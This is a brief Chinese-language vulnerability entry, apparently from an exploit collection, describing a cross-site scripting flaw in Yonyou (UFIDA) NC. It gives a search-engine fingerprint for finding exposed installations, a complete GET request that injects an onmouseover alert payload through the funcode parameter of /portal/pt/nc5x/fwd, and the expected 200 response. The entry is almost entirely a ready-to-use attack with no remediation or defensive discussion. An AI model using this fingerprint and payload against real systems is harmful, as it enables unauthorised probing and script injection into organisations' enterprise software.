# 用友NCexecNCAppletFunction存在XSS漏洞

用友 ｜ XSS ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/nc5x/fwd?pageId=login\&funcode=1%27);%22%20onmouseover=%22alert(`xss`)%22%20x=%22\&systemcode=1111 HTTP/1.1`
- **响应特征**：200